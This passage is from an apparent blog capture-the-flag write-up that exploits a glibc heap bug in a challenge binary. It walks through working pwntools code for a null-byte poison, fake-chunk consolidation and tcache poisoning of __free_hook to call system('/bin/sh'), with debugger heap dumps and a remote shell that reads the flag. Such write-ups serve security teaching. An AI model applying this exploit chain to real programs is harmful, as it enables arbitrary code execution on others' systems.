</code></pre></div><h3 id="null-byte-poison">Null-byte poison</h3><p>Now it&rsquo;s time to perform the null-byte poison attack. For this, we will be using two chunks (<code>a</code> and <code>b</code>, with indices <code>9</code> and <code>10</code>). We will use <code>a</code> to overflow the null byte into <code>b</code>&rsquo;s size field:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk8">do_str</span><span class="mtk1">(</span><span class="mtk7 mtki">0x</span><span class="mtk6">f8</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'a'</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">f8</span><span class="mtk1">)</span>  
<span class="mtk1">    </span><span class="mtk8">do_str</span><span class="mtk1">(</span><span class="mtk7 mtki">0x</span><span class="mtk6">f8</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'b'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk8">do_str</span><span class="mtk1">(</span><span class="mtk7 mtki">0x</span><span class="mtk6">f8</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'x'</span><span class="mtk1">)</span>

<span class="mtk1">    </span><span class="mtk5">for</span><span class="mtk1"> </span><span class="mtk1">i</span><span class="mtk1"> </span><span class="mtk5">in</span><span class="mtk1"> </span><span class="mtk8 mtku">range</span><span class="mtk1">(</span><span class="mtk6">6</span><span class="mtk1">):</span>
<span class="mtk1">        </span><span class="mtk8">do_del</span><span class="mtk1">(</span><span class="mtk6">5</span><span class="mtk1"> </span><span class="mtk5">-</span><span class="mtk1"> </span><span class="mtk1">i</span><span class="mtk1">)</span>
</code></pre></div><p>Notice that I filled the Tcache because we need to use Unsorted Bin chunks to trigger chunk consolidation. We have this heap layout:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef&gt; </span>visual-heap
<span class="code-dark-yellow">0x556137576b50: 0x0000000000000000 0x0000000000000101 | ................ |</span>
<span class="code-dark-yellow">0x556137576b60: 0x6161616161616161 0x6161616161616161 | aaaaaaaaaaaaaaaa |</span>
<span class="code-dark-yellow">* 14 lines, 0xe0 bytes</span>
<span class="code-dark-red">0x556137576c50: 0x6161616161616161 0x0000000000000101 | aaaaaaaa........ |</span>
<span class="code-dark-red">0x556137576c60: 0x0000000000000062 0x0000000000000000 | b............... |</span>
<span class="code-dark-red">0x556137576c70: 0x0000000000000000 0x0000000000000000 | ................ |</span>
<span class="code-dark-red">* 13 lines, 0xd0 bytes</span>
<span class="code-dark-green">0x556137576d50: 0x0000000000000000 0x0000000000000101 | ................ |</span>
<span class="code-dark-green">0x556137576d60: 0x0000000000000078 0x0000000000000000 | x............... |</span>
<span class="code-dark-green">0x556137576d70: 0x0000000000000000 0x0000000000000000 | ................ |</span>
<span class="code-dark-green">* 13 lines, 0xd0 bytes</span>
<span class="code-dark-blue">0x556137576e50: 0x0000000000000000 0x00000000000201b1 | ................ |  &lt;-  top</span>
<span class="code-dark-blue">0x556137576e60: 0x0000000000000000 0x0000000000000000 | ................ |</span>
<span class="code-dark-blue">* 8217 lines, 0x20190 bytes</span>
<span class="code-green">gef&gt; </span>bins tcache
<span class="code-dark-cyan">------------------------------------------------------------- Tcachebins for arena 'main_arena' -------------------------------------------------------------</span>  
tcachebins[idx=14, size=0x100, @<span class="code-dark-blue">0x5561375760c0</span>] count=6
 -&gt; <span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x556137576450</span>, size=<span class="code-magenta">0x100</span>, flags=<span class="code-red">PREV_INUSE</span>, fd=<span class="code-dark-blue">0x556137576560</span>, bk=<span class="code-dark-blue">0x556137576010</span>)
 -&gt; <span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x556137576550</span>, size=<span class="code-magenta">0x100</span>, flags=<span class="code-red">PREV_INUSE</span>, fd=<span class="code-dark-blue">0x556137576660</span>, bk=<span class="code-dark-blue">0x556137576010</span>)
 -&gt; <span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x556137576650</span>, size=<span class="code-magenta">0x100</span>, flags=<span class="code-red">PREV_INUSE</span>, fd=<span class="code-dark-blue">0x556137576760</span>, bk=<span class="code-dark-blue">0x556137576010</span>)
 -&gt; <span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x556137576750</span>, size=<span class="code-magenta">0x100</span>, flags=<span class="code-red">PREV_INUSE</span>, fd=<span class="code-dark-blue">0x556137576860</span>, bk=<span class="code-dark-blue">0x556137576010</span>)
 -&gt; <span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x556137576850</span>, size=<span class="code-magenta">0x100</span>, flags=<span class="code-red">PREV_INUSE</span>, fd=<span class="code-dark-blue">0x556137576960</span>, bk=<span class="code-dark-blue">0x556137576010</span>)
 -&gt; <span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x556137576950</span>, size=<span class="code-magenta">0x100</span>, flags=<span class="code-red">PREV_INUSE</span>, fd=0x000000000000, bk=<span class="code-dark-blue">0x556137576010</span>)
<span class="code-blue">[+]</span> Found 6 chunks in tcache.
</code></pre></div><p>There is still one slot remaining in the Tcache, I will use this slot to free <code>a</code> after causing the off-by-null:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk8">do_tok</span><span class="mtk1">(</span><span class="mtk6">9</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'</span><span class="mtk6">\x01</span><span class="mtk4">'</span><span class="mtk1">)</span>  
<span class="mtk1">    </span><span class="mtk8">do_del</span><span class="mtk1">(</span><span class="mtk6">9</span><span class="mtk1">)</span>
</code></pre></div><p>Next, we allocate again and insert a fake chunk inside chunk <code>a</code> and delete it again to keep the Tcache full:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk8">do_del</span><span class="mtk1">(</span>
<span class="mtk1">        </span><span class="mtk8">do_str</span><span class="mtk1">(</span>
<span class="mtk1">            </span><span class="mtk7 mtki">0x</span><span class="mtk6">f8</span><span class="mtk1">,</span>
<span class="mtk1">            p64(</span><span class="mtk6">0</span><span class="mtk1">) </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">2</span><span class="mtk1"> </span><span class="mtk5">+</span>
<span class="mtk1">            p64(</span><span class="mtk6">0</span><span class="mtk1">) </span><span class="mtk5">+</span><span class="mtk1"> p64(</span><span class="mtk7 mtki">0x</span><span class="mtk6">e0</span><span class="mtk1">) </span><span class="mtk5">+</span>
<span class="mtk1">            p64(</span><span class="mtk1">heap_addr</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">b80</span><span class="mtk1">) </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">2</span><span class="mtk1"> </span><span class="mtk5">+</span>  
<span class="mtk1">            p64(</span><span class="mtk1">heap_addr</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">b70</span><span class="mtk1">) </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk6">2</span><span class="mtk1"> </span><span class="mtk5">+</span>
<span class="mtk1">            </span><span class="mtk7 mtki">b</span><span class="mtk4">'c'</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">b0</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> p64(</span><span class="mtk7 mtki">0x</span><span class="mtk6">e0</span><span class="mtk1">)</span>
<span class="mtk1">        )</span>
<span class="mtk1">    )</span>
</code></pre></div><p>This is now the heap layout:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef&gt; </span>visual-heap
<span class="code-dark-yellow">0x556137576b50: 0x0000000000000000 0x0000000000000101 | ................ |</span>
<span class="code-dark-yellow">0x556137576b60: 0x0000556137576460 0x0000556137576010 | `dW7aU...`W7aU.. |  &lt;-  tcache[idx=14,sz=0x100][1/7]</span>  
<span class="code-dark-yellow">0x556137576b70: 0x0000000000000000 0x00000000000000e0 | ................ |</span>
<span class="code-dark-yellow">0x556137576b80: 0x0000556137576b80 0x0000556137576b80 | .kW7aU...kW7aU.. |</span>
<span class="code-dark-yellow">0x556137576b90: 0x0000556137576b70 0x0000556137576b70 | pkW7aU..pkW7aU.. |</span>
<span class="code-dark-yellow">0x556137576ba0: 0x6363636363636363 0x6363636363636363 | cccccccccccccccc |</span>
<span class="code-dark-yellow">* 10 lines, 0xa0 bytes</span>
<span class="code-dark-red">0x556137576c50: 0x00000000000000e0 0x0000000000000100 | ................ |</span>
<span class="code-dark-red">0x556137576c60: 0x0000000000000062 0x0000000000000000 | b............... |</span>
<span class="code-dark-red">0x556137576c70: 0x0000000000000000 0x0000000000000000 | ................ |</span>
<span class="code-dark-red">* 13 lines, 0xd0 bytes</span>
<span class="code-dark-green">0x556137576d50: 0x0000000000000000 0x0000000000000101 | ................ |</span>
<span class="code-dark-green">0x556137576d60: 0x0000000000000078 0x0000000000000000 | x............... |</span>
<span class="code-dark-green">0x556137576d70: 0x0000000000000000 0x0000000000000000 | ................ |</span>
<span class="code-dark-green">* 13 lines, 0xd0 bytes</span>
<span class="code-dark-blue">0x556137576e50: 0x0000000000000000 0x00000000000201b1 | ................ |  &lt;-  top</span>
<span class="code-dark-blue">0x556137576e60: 0x0000000000000000 0x0000000000000000 | ................ |</span>
<span class="code-dark-blue">* 8217 lines, 0x20190 bytes</span>
</code></pre></div><p>Notice the following:</p><ul><li>The <code>b</code> chunk has <code>PREV_INUSE</code> set to <code>0</code></li><li>The <code>b</code> chunk has <code>prev_size</code> equal to <code>0xe0</code></li><li>There is a fake chunk of size <code>0xe0</code> exactly <code>0xe0</code> bytes above</li><li>The <code>fd</code> and <code>bk</code> pointers of the fake chunk satisfy the security checks because:</li></ul><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">P->fd->bk = *((*((0x556137576b70).fd)).bk)
          = *(*(0x556137576b70 + 0x10) + 0x18)  
          = *(*(0x556137576b80) + 0x18)
          = *(0x556137576b80 + 0x18)
          = *(0x556137576b98)
          = 0x556137576b70
          = P

P->bk->fd = *((*((0x556137576b70).bk)).fd)
          = *(*(0x556137576b70 + 0x18) + 0x10)
          = *(*(0x556137576b88) + 0x10)
          = *(0x556137576b80 + 0x10)
          = *(0x556137576b90)
          = 0x556137576b70
          = P
</code></pre></div><p>As a result, we can delete chunk <code>b</code> (index <code>10</code>) and the heap allocator will consolidate chunk <code>b</code> with the fake chunk:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk8">do_del</span><span class="mtk1">(</span><span class="mtk6">10</span><span class="mtk1">)</span>  
</code></pre></div><p>We get this:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef&gt; </span>visual-heap
<span class="code-dark-yellow">0x556137576b50: 0x0000000000000000 0x0000000000000101 | ................ |</span>
<span class="code-dark-yellow">0x556137576b60: 0x0000556137576460 0x0000556137576010 | `dW7aU...`W7aU.. |  &lt;-  tcache[idx=14,sz=0x100][1/7]</span>  
<span class="code-dark-yellow">0x556137576b70: 0x0000000000000000 0x00000000000001e1 | ................ |  &lt;-  unsortedbins[1/1]</span>
<span class="code-dark-yellow">0x556137576b80: 0x00007fd2ff7ebca0 0x00007fd2ff7ebca0 | ..~.......~..... |</span>
<span class="code-dark-yellow">0x556137576b90: 0x0000556137576b80 0x0000556137576b80 | .kW7aU...kW7aU.. |</span>
<span class="code-dark-yellow">0x556137576ba0: 0x6363636363636363 0x6363636363636363 | cccccccccccccccc |</span>
<span class="code-dark-yellow">* 10 lines, 0xa0 bytes</span>
<span class="code-dark-red">0x556137576c50: 0x00000000000000e0 0x0000000000000100 | ................ |</span>
<span class="code-dark-red">0x556137576c60: 0x0000000000000062 0x0000000000000000 | b............... |</span>
<span class="code-dark-red">0x556137576c70: 0x0000000000000000 0x0000000000000000 | ................ |</span>
<span class="code-dark-red">* 13 lines, 0xd0 bytes</span>
<span class="code-dark-green">0x556137576d50: 0x00000000000001e0 0x0000000000000100 | ................ |</span>
<span class="code-dark-green">0x556137576d60: 0x0000000000000078 0x0000000000000000 | x............... |</span>
<span class="code-dark-green">0x556137576d70: 0x0000000000000000 0x0000000000000000 | ................ |</span>
<span class="code-dark-green">* 13 lines, 0xd0 bytes</span>
<span class="code-dark-blue">0x556137576e50: 0x0000000000000000 0x00000000000201b1 | ................ |  &lt;-  top</span>
<span class="code-dark-blue">0x556137576e60: 0x0000000000000000 0x0000000000000000 | ................ |</span>
<span class="code-dark-blue">* 8217 lines, 0x20190 bytes</span>
</code></pre></div><p>Observe that we have overlapping chunks, since chunk <code>a</code> is in the Tcache and inside we have our fake chunk in the Unsorted Bin.</p><h3 id="tcache-poisoning">Tcache poisoning</h3><p>Now we can allocate and free some small chunks and after that do a Tcache poisoning attack:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk1">i</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">do_str</span><span class="mtk1">(</span><span class="mtk7 mtki">0x</span><span class="mtk6">18</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'Q'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk8">do_del</span><span class="mtk1">(</span><span class="mtk8">do_str</span><span class="mtk1">(</span><span class="mtk7 mtki">0x</span><span class="mtk6">18</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'x'</span><span class="mtk1">))</span>  
<span class="mtk1">    </span><span class="mtk8">do_del</span><span class="mtk1">(</span><span class="mtk1">i</span><span class="mtk1">)</span>
</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef&gt; </span>visual-heap
<span class="code-dark-yellow">0x556137576b50: 0x0000000000000000 0x0000000000000101 | ................ |</span>
<span class="code-dark-yellow">0x556137576b60: 0x0000556137576460 0x0000556137576010 | `dW7aU...`W7aU.. |  &lt;-  tcache[idx=14,sz=0x100][1/7]</span>  
<span class="code-dark-yellow">0x556137576b70: 0x0000000000000000 0x0000000000000021 | ........!....... |</span>
<span class="code-dark-yellow">0x556137576b80: 0x0000556137576ba0 0x0000556137576010 | .kW7aU...`W7aU.. |  &lt;-  tcache[idx=0,sz=0x20][1/2]</span>
<span class="code-dark-yellow">0x556137576b90: 0x0000556137576b80 0x0000000000000021 | .kW7aU..!....... |</span>
<span class="code-dark-yellow">0x556137576ba0: 0x0000000000000000 0x0000556137576010 | .........`W7aU.. |  &lt;-  tcache[idx=0,sz=0x20][2/2]</span>
<span class="code-dark-yellow">0x556137576bb0: 0x6363636363636363 0x00000000000001a1 | cccccccc........ |  &lt;-  unsortedbins[1/1]</span>
<span class="code-dark-yellow">0x556137576bc0: 0x00007fd2ff7ebca0 0x00007fd2ff7ebca0 | ..~.......~..... |</span>
<span class="code-dark-yellow">0x556137576bd0: 0x6363636363636363 0x6363636363636363 | cccccccccccccccc |</span>
<span class="code-dark-yellow">* 7 lines, 0x70 bytes</span>
<span class="code-dark-red">0x556137576c50: 0x00000000000000e0 0x0000000000000100 | ................ |</span>
<span class="code-dark-red">0x556137576c60: 0x0000000000000062 0x0000000000000000 | b............... |</span>
<span class="code-dark-red">0x556137576c70: 0x0000000000000000 0x0000000000000000 | ................ |</span>
<span class="code-dark-red">* 13 lines, 0xd0 bytes</span>
<span class="code-dark-green">0x556137576d50: 0x00000000000001a0 0x0000000000000100 | ................ |</span>
<span class="code-dark-green">0x556137576d60: 0x0000000000000078 0x0000000000000000 | x............... |</span>
<span class="code-dark-green">0x556137576d70: 0x0000000000000000 0x0000000000000000 | ................ |</span>
<span class="code-dark-green">* 13 lines, 0xd0 bytes</span>
<span class="code-dark-blue">0x556137576e50: 0x0000000000000000 0x00000000000201b1 | ................ |  &lt;-  top</span>
<span class="code-dark-blue">0x556137576e60: 0x0000000000000000 0x0000000000000000 | ................ |</span>
<span class="code-dark-blue">* 8217 lines, 0x20190 bytes</span>
</code></pre></div><p>Next we allocate a <code>0x100</code>-sized chunk, which will be placed where chunk <code>a</code> because it was the last to be freed, and modify the <code>fd</code> pointer of the first <code>0x20</code>-sized chunk to point to <code>__free_hook</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk8">do_str</span><span class="mtk1">(</span><span class="mtk7 mtki">0x</span><span class="mtk6">f8</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'X'</span><span class="mtk1"> </span><span class="mtk5">*</span><span class="mtk1"> </span><span class="mtk7 mtki">0x</span><span class="mtk6">18</span><span class="mtk1"> </span><span class="mtk5">+</span><span class="mtk1"> p64(</span><span class="mtk7 mtki">0x</span><span class="mtk6">21</span><span class="mtk1">) </span><span class="mtk5">+</span><span class="mtk1"> p64(</span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">sym</span><span class="mtk1">.__free_hook))</span>  
</code></pre></div><p>Observe that the Tcache <code>0x20</code> free-list is corrupted and the <code>fd</code> points to <code>__free_hook</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef&gt; </span>bins tcache
<span class="code-dark-cyan">---------------------- Tcachebins for arena 'main_arena' ----------------------</span>
tcachebins[idx=0, size=0x20, @<span class="code-dark-blue">0x556137576050</span>] count=2
 -&gt; <span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x556137576b70</span>, size=<span class="code-magenta">0x20</span>, flags=<span class="code-red">PREV_INUSE</span>, fd=<span class="code-dark-green">0x7fd2ff7ed8e8</span>, bk=<span class="code-dark-blue">0x556137576010</span>)
 -&gt; <span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x7fd2ff7ed8d8</span>, size=<span class="code-magenta">0x0</span>, flags=, fd=0x000000000000, bk=0x000000000000)
tcachebins[idx=14, size=0x100, @<span class="code-dark-blue">0x5561375760c0</span>] count=6
 -&gt; <span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x556137576450</span>, size=<span class="code-magenta">0x100</span>, flags=<span class="code-red">PREV_INUSE</span>, fd=<span class="code-dark-blue">0x556137576560</span>, bk=<span class="code-dark-blue">0x556137576010</span>)  
 -&gt; <span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x556137576550</span>, size=<span class="code-magenta">0x100</span>, flags=<span class="code-red">PREV_INUSE</span>, fd=<span class="code-dark-blue">0x556137576660</span>, bk=<span class="code-dark-blue">0x556137576010</span>)
 -&gt; <span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x556137576650</span>, size=<span class="code-magenta">0x100</span>, flags=<span class="code-red">PREV_INUSE</span>, fd=<span class="code-dark-blue">0x556137576760</span>, bk=<span class="code-dark-blue">0x556137576010</span>)
 -&gt; <span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x556137576750</span>, size=<span class="code-magenta">0x100</span>, flags=<span class="code-red">PREV_INUSE</span>, fd=<span class="code-dark-blue">0x556137576860</span>, bk=<span class="code-dark-blue">0x556137576010</span>)
 -&gt; <span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x556137576850</span>, size=<span class="code-magenta">0x100</span>, flags=<span class="code-red">PREV_INUSE</span>, fd=<span class="code-dark-blue">0x556137576960</span>, bk=<span class="code-dark-blue">0x556137576010</span>)
 -&gt; <span class="code-cyan mtku">Chunk</span>(addr=<span class="code-yellow">0x556137576950</span>, size=<span class="code-magenta">0x100</span>, flags=<span class="code-red">PREV_INUSE</span>, fd=0x000000000000, bk=<span class="code-dark-blue">0x556137576010</span>)
<span class="code-blue">[+]</span> Found 8 chunks in tcache.
</code></pre></div><p>Now, we can allocate two <code>0x20</code>-sized chunks, the second one will be placed at <code>__free_hook</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk1">s</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8">do_str</span><span class="mtk1">(</span><span class="mtk7 mtki">0x</span><span class="mtk6">18</span><span class="mtk1">, </span><span class="mtk7 mtki">b</span><span class="mtk4">'/bin/sh'</span><span class="mtk1">)</span>
<span class="mtk1">    </span><span class="mtk8">do_str</span><span class="mtk1">(</span><span class="mtk7 mtki">0x</span><span class="mtk6">18</span><span class="mtk1">, p64(</span><span class="mtk1">glibc</span><span class="mtk1">.</span><span class="mtk1">sym</span><span class="mtk1">.system))</span>  
</code></pre></div><p>Let&rsquo;s see if we have the address of <code>system</code> at <code>__free_hook</code>:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-green">gef&gt; </span>x/gx &__free_hook
<span class="code-dark-blue">0x7fd2ff7ed8e8</span> &lt;<span class="code-dark-yellow">__free_hook</span>&gt;:   0x00007fd2ff44f420  
<span class="code-green">gef&gt; </span>x/gx (void*) __free_hook
<span class="code-dark-blue">0x7fd2ff44f420</span> &lt;<span class="code-dark-yellow">system</span>&gt;:        0xfa66e90b74ff8548
</code></pre></div><p>Alright, so at this point, we will be calling <code>system</code> whenever we execute <code>free</code>. Therefore, if we delete the previous chunk that holds <code>"/bin/sh"</code>, we will be running <code>system("/bin/sh")</code> and we will have a shell:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">    </span><span class="mtk8">do_del</span><span class="mtk1">(</span><span class="mtk1">s</span><span class="mtk1">)</span>  
</code></pre></div><p>Here we have it:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span>
</span>[<span class="code-blue">*</span>] './chall'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-green">Full RELRO</span>
    Stack:    <span class="code-dark-green">Canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-green">PIE enabled</span>
    RUNPATH:  <span class="code-dark-red">b'.'</span>
[<span class="code-green">+</span>] Starting local process './chall': pid 3295687
[<span class="code-blue">*</span>] running in new terminal: ['/usr/bin/gdb', '-q', './chall', '3295687', '-x', '/tmp/pwn3wxiodgv.gdb']  
[<span class="code-green">+</span>] Waiting for debugger: Done
[<span class="code-blue">*</span>] Heap base address: 0x556137576000
[<span class="code-green">+</span>] Glibc base address: 0x7fd2ff400000
</span>[<span class="code-blue">*</span>] Switching to interactive mode
<span class="code-red">$</span> ls
chall  Dockerfile  flag.txt  ld-linux-x86-64.so.2  libc.so.6  solve.py
</code></pre></div><h2 id="flag">Flag</h2><p>Let&rsquo;s run the exploit remotely:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> <span class="mtku">solve.py</span> mc.ax 32526
[<span class="code-blue">*</span>] './chall'
    Arch:     amd64-64-little
    RELRO:    <span class="code-dark-green">Full RELRO</span>
    Stack:    <span class="code-dark-green">Canary found</span>
    NX:       <span class="code-dark-green">NX enabled</span>
    PIE:      <span class="code-dark-green">PIE enabled</span>
    RUNPATH:  <span class="code-dark-red">b'.'</span>
[<span class="code-green">+</span>] Opening connection to mc.ax on port 32526: Done  
[<span class="code-blue">*</span>] Heap base address: 0x5cb86eb40000
[<span class="code-green">+</span>] Glibc base address: 0x7d812429c000
[<span class="code-blue">*</span>] Switching to interactive mode
<span class="code-red">$</span> ls
flag.txt
run
<span class="code-red">$</span> cat flag.txt
dice{tkjctf_lmeow_fee9c2ee3952d7b9479306ddd8e477ca}
</code></pre></div><p>The full exploit can be found in here: <a target="_blank" href="https://github.com/7Rocky/CTF-scripts/blob/main/DiceCTF/baby-talk/solve.py"><code>solve.py</code></a>.</p><div class="mt6 instapaper_ignoref"></div></div><aside aria-label="aside" class="w-20-l aside-desktop"><div class="bg-card pa3 nested-list-reset nested-copy-line-height nested-links" style="position:sticky;top:5rem;padding-bottom:0"><p class="f5 b pb2" style="border-bottom:5px solid var(--background);margin:0">Contents</p><nav id="TableOfContents"><ul><li><a href="#reverse-engineering">Reverse engineering</a><ul><li><a href="#allocation-function">Allocation function</a></li><li><a href="#free-function">Free function</a></li><li><a href="#token-function">Token function</a></li></ul></li><li><a href="#setup-environment">Setup environment</a><ul><li><a href="#different-versions">Different versions</a></li></ul></li><li><a href="#exploit-strategy">Exploit strategy</a></li><li><a href="#exploit-development">Exploit development</a><ul><li><a href="#leaking-memory-addresses">Leaking memory addresses</a></li><li><a href="#null-byte-poison">Null-byte poison</a></li><li><a href="#tcache-poisoning">Tcache poisoning</a></li></ul></li><li><a href="#flag">Flag</a></li></ul></nav><div class="bg-card" style="border-top:5px solid var(--background)"><a class="bmc-btn w-100" target="_blank" href="http://buymeacoffee.com/7Rocky" style="padding:0" title="Buy me a beer">üç∫ <span class="bmc-btn-text" style="font-family:Cookie!important;color:#fff">Buy me a beer</span></a></div></div></aside></article></main><footer class="bottom-0 w-100" role="contentinfo"><div class="tc mw8 ph3" style="margin:auto"><form style="background-color:var(--background-card)" class="tc mw8 pv3 mb3" action="https://mailchi.mp/59ffae939360/7rockys-blog-weekly-newsletter" target="popupwindow" onsubmit='return window.open("https://mailchi.mp/59ffae939360/7rockys-blog-weekly-newsletter"),!0'><h3 class="tc">7Rocky's Blog Weekly Newsletter</h3><p class="tc"><input class="f5 pv3 ph3 bn" style="background-color:var(--background);color:inherit;font-weight:700;line-height:normal" type="submit" value="Receive a weekly blog digest"></p><input type="hidden" value="1" name="embed">
<input style="display:none;color:var(--header)" type="submit" value="Subscribe"><p class="tc"><a href="/en/newsletters/" target="_blank" title="View letter archive">View letter archive</a></p><p class="tc">powered by <a href="http://www.mailchimp.com" target="_blank" title="Mailchimp">Mailchimp</a></p></form></div><div class="bg-black w-100 pa3" role="contentinfo"><div class="flex justify-between"><a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="https://7rocky.github.io/" title="https://7rocky.github.io/">&copy; 7Rocky's Blog. Cybersecurity and Maths 2024</a><div style="margin-top:8px"><div><div><a href="https://www.linkedin.com/in/roberto-gesteira-minarro/" target="_blank" class="link-transition linkedin link dib z-999 pt3 pt0-l mr1" title="LinkedIn link" rel="noopener" aria-label="follow on LinkedIn‚Äî‚ÄîOpens in a new window"><svg height="30" style="enable-background:new 0 0 65 65" viewBox="0 0 65 65" width="30" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M50.837 48.137V36.425c0-6.275-3.35-9.195-7.816-9.195-3.604.0-5.219 1.983-6.119 3.374V27.71h-6.79c.09 1.917.0 20.427.0 20.427h6.79V36.729c0-.609.044-1.219.224-1.655.49-1.22 1.607-2.483 3.482-2.483 2.458.0 3.44 1.873 3.44 4.618v10.929H50.837zM22.959 24.922c2.367.0 3.842-1.57 3.842-3.531-.044-2.003-1.475-3.528-3.797-3.528s-3.841 1.524-3.841 3.528c0 1.961 1.474 3.531 3.753 3.531H22.959zM34 64C17.432 64 4 50.568 4 34 4 17.431 17.432 4 34 4s30 13.431 30 30c0 16.568-13.432 30-30 30zM26.354 48.137V27.71h-6.789v20.427h6.789z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
<span class="new-window"><svg height="8" style="enable-background:new 0 0 1000 1000" viewBox="0 0 1e3 1e3" width="8" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><path d="M598 128h298v298h-86V274L392 692l-60-60 418-418H598v-86zM810 810V512h86v298c0 46-40 86-86 86H214c-48 0-86-40-86-86V214c0-46 38-86 86-86h298v86H214v596h596z" style="fill-rule:evenodd;clip-rule:evenodd;fill:"/></svg>
